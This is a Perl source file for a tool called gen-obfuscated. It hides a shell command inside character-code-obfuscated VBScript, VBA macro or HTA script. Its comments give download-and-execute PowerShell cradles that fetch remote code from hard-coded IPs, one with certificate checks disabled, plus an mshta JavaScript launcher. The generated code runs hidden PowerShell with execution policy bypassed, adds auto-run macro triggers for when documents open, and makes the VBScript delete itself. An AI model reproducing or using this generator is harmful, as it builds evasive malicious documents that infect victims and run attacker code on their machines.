#!/usr/bin/perl
#
# Converts a character to it's ascii code value. Works as a 
# simple vb-s/a obfuscator specificly for shell command 
# execution. The current examples focus on powershell based 
# attacks but is not limited to them.
#
# License MIT					xor-function

use strict;
use Encode;
use MIME::Base64;

#######[ String of Powershell Or Someother CMD command to be obfuscated ]###################################################
# 
# If you already have a powershell command with encoding, this can also be used with the alphanumeric shellcode injector payload
# generated by the setoolkit, I warn you this will create a very long script upwards of 350 lines...
#
# cmd /c powershell -w hidden -enc <-base64 encoded string-> 
#
# If you choose to use a encoded command, any command will be prepended with the following  
# cmd /c powershell -w hidden -enc <- your encoded command will be inserted here ->
#
# OR
#
# When only using ascii character function obfuscation, an example
# cmd /c powershell.exe -w hidden -c iex (New-Object System.Net.WebClient).DownloadString('http://192.168.43.166/rvs-nsh')
#
# OR
#
# A oneliner that supports a dowloadstring from a https site with a self-signed cert.
# cmd /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString('https://192.168.43.162/client')}"
#
# OR
#
# A command that produces a popup, for testing only using ascii chr function obfuscation 
# cmd /c powershell.exe -w hidden -c iex (New-Object -ComObject Wscript.Shell).Popup('IEX Decoded and Executed!',0,'Done',0x1)
#
# OR
#
# A command using javascript to pass commands directly to mshta, for maximum effect use script type 3
# cmd /c mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Javascript decoded and Executed', 15, 'From gen-obfuscated', 64 );close()"
#
# Be Creative...
#################################################################################################################

#################################################################################################################
# The options are included inside due to particularities of escaping powershell code passed as an 
# Prob best to bypass bash and have Perl directly accept input....

#######[ Script Type ]#############
#
#  1 for vbscript
#  2 for vba macro ---> EXPERIMENTAL large macros can be generated affects still unknown...
#  3 for hta script

sub set_type { 

	my $type;
	my $opt;
	
        print "[===========================================================================]\n";
        print "[                              gen-obfuscated                               ]\n";
        print "[===========================================================================]\n";

	print "[*] Avaliable Script formats...\n\n";
	print "[1]-> vbscript\n";
	print "[2]-> vba macro  [EXPERIMENTAL! Macros will a large code size may fail.]\n";
	print "[3]-> hta [vbscript]\n\n";

	while (1) {
		print "[*] Select the option number for the type of code you wish to generate.\n";
		$type = <STDIN>;
		chomp($type);

		while (1) {

			if ( $type eq '1' ) { last; }
			if ( $type eq '2' ) { last; }
			if ( $type eq '3' ) { last; }
			else { 
				print "[!] That's not an avaliable option! Try again.\n";
				$type = <STDIN>;
				chomp($type);
			}

		}

		print "[+] you entered: [ $type ]\n";
		print "[?] Is this correct? (yes/no)?\n";
		
		$opt = <STDIN>;
		chomp($opt);

		if ($opt =~ /y/i or $opt =~ /yes/i ) {
    			print "[+] Continuing...\n";
			last;
		}
		elsif ($opt =~ /n/i or $opt =~ /no/i ) {
			print "[!] Re-enter selection.\n";
		}
		else {  print "[*] Input not understood, re-enter option.\n"; }

	}

	return $type;
} 

#######[ Encode Your IEX? ]#############################
#
# base64 encoding in Powershell, set to false if you already have a base64 encoded payload or 
# you want your iex only obfuscated by ascii code.

sub set_encoding { 

	my $opt;
	my $choice;
	
	print "[*] Do you wish to encode your powershell command?\n\n";
	print "[Y]-> Yes\n";
	print "[N]-> No\n\n";

	while (1) {

		print "[*] Please enter (Y/N)\n";	
		$opt = <STDIN>;
		chomp($opt);

		if ($opt =~ /y/i or $opt =~ /yes/i ) {
    			print "[+] Encoding will be used...\n";
			$choice = 'true';
			last;
		}
		elsif ($opt =~ /n/i or $opt =~ /no/i ) {
			print "[!] No encoding will be used...\n";
			$choice = 'false';
			last;
		}
		else {  print "[*] Input not understood, re-enter option.\n"; }

	}

	return $choice;

} 

#######[ PowerShell IEX ]################################
#
# The command you wish to be base64 encoded 
#
# IMPORTANT the command string must be enclose with --> q( );
#
# my $rawenc = q(iex (New-Object -ComObject Wscript.Shell).Popup('IEX Decoded and Executed!',0,'Done',0x1));
#

sub get_cmd {

	my $cmdstring;
	my $opt;

	while (1) {
		print "[*] Please enter the command you wish to execute.\n";
		print "[*] press enter when done.\n";
		$cmdstring = <STDIN>;
		chomp($cmdstring);

		print "[+] you entered: [ $cmdstring ]\n";
		print "[?] Is this correct? (yes/no)?\n";
		
		$opt = <STDIN>;
		chomp($opt);

		if ($opt =~ /y/i or $opt =~ /yes/i ) {
    			print "[+] Continuing...\n";
			last;
		}
		elsif ($opt =~ /n/i or $opt =~ /no/i ) {
			print "[!] Re-enter selection.\n";
		}
		else {  print "[*] Input not understood, re-enter option.\n"; }

	}

	return $cmdstring;

} 


sub rstr {

        my @chr = ("A".."Z", "a".."z");
        my $rloop = int(rand(8) + int(4));
        my $rstring;

        while ($rloop != 0) {

                $rstring .= $chr[int(rand(52))];
                $rloop--;
        }

        return $rstring;

}

sub gen_code {

        my @chars = split("", $_[0]);
	my $stype = $_[1];
        my $cnt = 1;
        my @rvars;

	my $scriptname = 'code-output';
	open(my $fh, '+>', "$scriptname" );

        # create look up table for translation
        my %table = (

                ' ' => '32',
                '!' => '33',
                '"' => '34',
                '#' => '35',
                '$' => '36',
                '%' => '37',
                '&' => '38',
                q(') => '39',
                '(' => '40',
                ')' => '41',
                '*' => '42',
                '+' => '43',
                ',' => '44',
                '-' => '45',
                '.' => '46',
                '/' => '47',
                '0' => '48',
                '1' => '49',
                '2' => '50',
                '3' => '51',
                '4' => '52',
                '5' => '53',
                '6' => '54',
                '7' => '55',
                '8' => '56',
                '9' => '57',
                ':' => '58',
                ';' => '59',
                '<' => '60',
                '=' => '61',
                '>' => '62',
                '?' => '63',
                '@' => '64',
                'A' => '65',
                'B' => '66',
                'C' => '67',
                'D' => '68',
                'E' => '69',
                'F' => '70',
                'G' => '71',
                'H' => '72',
                'I' => '73',
                'J' => '74',
                'K' => '75',
                'L' => '76',
                'M' => '77',
                'N' => '78',
                'O' => '79',
                'P' => '80',
                'Q' => '81',
                'R' => '82',
                'S' => '83',
                'T' => '84',
                'U' => '85',
                'V' => '86',
                'W' => '87',
                'X' => '88',
                'Y' => '89',
                'Z' => '90',
                '[' => '91',
                q(\\) => '92',
                ']' => '93',
                '^' => '94',
                '_' => '95',
                '`' => '96',
                'a' => '97',
                'b' => '98',
                'c' => '99',
                'd' => '100',
                'e' => '101',
                'f' => '102',
                'g' => '103',
                'h' => '104',
                'i' => '105',
                'j' => '106',
                'k' => '107',
                'l' => '108',
                'm' => '109',
                'n' => '110',
                'o' => '111',
                'p' => '112',
                'q' => '113',
                'r' => '114',
                's' => '115',
                't' => '116',
                'u' => '117',
                'v' => '118',
                'w' => '119',
                'x' => '120',
                'y' => '121',
                'z' => '122',
                '{' => '123',
                '|' => '124',
                '}' => '125',
                '~' => '126',

        );

        # Add function header for vbscript or vba
        my $rsub = rstr();
        my $rfunc = rstr();

        if ($stype eq 1 ) { print $fh "\n", ,'Function ' . $rfunc . '()',"\n"; }
        if ($stype eq 2 ) { print $fh "\n", ,'Sub ' . $rsub . '()',"\n"; }
        if ($stype eq 3 ) {
                print $fh '<SCRIPT LANGUAGE="VBScript">', "\n";
                print $fh 'sub ' . $rfunc . '()',"\n";
        }

        my $nline = int(rand(3));
        foreach (@chars) {

                my $char = $_;

                # Perform simple randomization
                my $n = $table{$char};
                my $rn = int(rand(10));
                my $math = int(rand(2));

                my $nnum;
                if ( $math == 0 ) { $nnum = int($n) - int($rn);}
                else { $nnum = int($n) + int($rn); }

                my $val = int($nnum) / int(2);
                my $switch = int(rand(3));
                my $flnline = int(rand(2));

                # determine start of loop for proper format 
                if ($cnt == 1 ) {

                        my $rvar = rstr();
                        push (@rvars, $rvar);
                        if ( $flnline == 1 ) { print $fh "\n"; }
                        if ( $math == 0 ) { print $fh $rvar . ' = ' . 'chr(' . $val . '+' . $val . '+' . $rn . ')'; }
                        else { print $fh $rvar . ' = ' . 'chr(' . $val . '+' . $val . '-' . $rn . ')'; }

                } else {

                        if ( $math == 0 ) {
                                # Add additional randomization to template, prob overkill but why not?
                                if ( $switch == 0 ) { print $fh ' & chr(' . $val . '+' . $val . '+' . $rn . ')'; }
                                if ( $switch == 1 ) { print $fh ' &chr(' . $val . '+' . $val . '+' . $rn . ')'; }
                                if ( $switch == 2 ) { print $fh '& chr(' . $val . '+' . $val . '+' . $rn . ')'; }
                        } else {
                                if ( $switch == 0 ) { print $fh ' & chr(' . $val . '+' . $val . '-' . $rn . ')'; }
                                if ( $switch == 1 ) { print $fh ' &chr(' . $val . '+' . $val . '-' . $rn . ')'; }
                                if ( $switch == 2 ) { print $fh '& chr(' . $val . '+' . $val . '-' . $rn . ')'; }
                        }

                        if ( 7 == int(rand(12)) ) { print $fh "\n"; $cnt = 0; }

                }

                $cnt++;
        }

        # prep variable concatenation
        $cnt = 1;
        my $rcmdvar;
        my $nline = int(rand(4));
        if ( $nline == 0 ) { print $fh "\n"; }
        foreach (@rvars) {

                if ($cnt == 1 ) { $rcmdvar = rstr(); print $fh "\n$rcmdvar" . ' = ' . "$_"; }
                else { print $fh ' + ' . "$_"; }
                $cnt++;

        }

        # additional template randomization...
        if ( $nline == 1 ) { print $fh "\n"; }

        # set vba syntax
        if ( $stype eq 2 ) {

                my $vbaSh = rstr();

                print $fh "\n\n", $vbaSh . ' = '. 'Shell(' . $rcmdvar . ',' . ' 0' . ')';
                if ( $nline == 3 ) { print $fh "\n"; }
                print $fh "\n", 'End Sub';
                if ( $nline == 1 ) { print $fh "\n"; }
                print $fh "\n", 'Sub AutoOpen(): ' . $rsub . ': End Sub';
                if ( $nline == 0 ) { print $fh "\n"; }
                print $fh "\n", 'Sub Auto_Open(): ' . $rsub . ': End Sub';
                if ( $nline == 2 ) { print $fh "\n"; }
                print $fh "\n", 'Sub Workbook_Open(): ' . $rsub . ': End Sub';

        }

        # set vbscript syntax
        if ( $stype eq 1 or $stype eq 3 ) {

                my $vbsShobj = rstr();
                my $robjfso = rstr();
                my $rspace = int(rand(2));

                if ( $rspace == 0 ) {

                        print $fh "\n\n", 'set ' . $vbsShobj . ' = ' . 'CreateObject("Wscript.Shell")';
                        print $fh "\n", $vbsShobj . '.run '. $rcmdvar . ',' . ' 0,' . ' true';
                }

                if ( $rspace == 1 ) {

                        print $fh "\n", 'set ' . $vbsShobj . ' = ' . 'CreateObject("Wscript.Shell")';
                        print $fh "\n\n", $vbsShobj . '.run '. $rcmdvar . ',' . ' 0,' . ' true';

                }

                if ( $stype eq 1 ) {

                        print $fh "\n", 'set ' . $robjfso . ' = ' . 'CreateObject("Scripting.FileSystemObject")';
                        if ( $rspace == 0 ) { print $fh "\n"; }
                        print $fh "\n", $robjfso . '.DeleteFile ' . 'Wscript.ScriptFullName';
                        if ( $rspace == 1 ) { print "\n"; }
                        print $fh "\n", 'End Function';
                        print $fh "\n", $rfunc;

                }

                if ($stype eq 3 ) {

                        print $fh "\n", 'window.close()';
                        if ( $rspace == 1 ) { print $fh "\n"; }
                        print $fh "\n", 'end sub';
                        print $fh "\n", $rfunc;
                        if ( $rspace == 0 ) { print $fh "\n"; }
                        print $fh "\n", '</SCRIPT>', "\n";

                }

        }
	
	print $fh "\n";
	close $fh;

}

# test character encoding  
#  my $cmd = qw(!"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~);

sub main {

	my $stype = set_type();
	my $use_encoding = set_encoding();

	if ($use_encoding eq 'true' ) {

		print "[!] your encoded command will prepended with the following commands\n";
		print "[>] cmd.exe /c powershell.exe -ep bypass -noni -w hidden -enc [your command to be encodede]\n";
		print "[*] enter command (iex anonymous function etc..)\n";

		my $rawenc = get_cmd();
		my $utf16le = encode("UTF-16LE", $rawenc);

		# Passing an empty string to encode_base64 to prevent any newlines
		my $encdcmd = encode_base64($utf16le, '');
		my $base64cmd = 'cmd.exe /c powershell.exe -ep bypass -noni -w hidden -enc' . ' ' . $encdcmd;
		gen_code($base64cmd, $stype);

	} else { 

        	print "[!] Your command will not be prepended with anything.\n";
        	print '[>] c:\users\some-user\> [ your command you wish to run ]' . "\n";

		my $cmd = get_cmd();
        	gen_code($cmd, $stype); 

	}

	print "[+] Generated to file named code-output..\n";
	print "\n\n";

}

main();
exit(0);
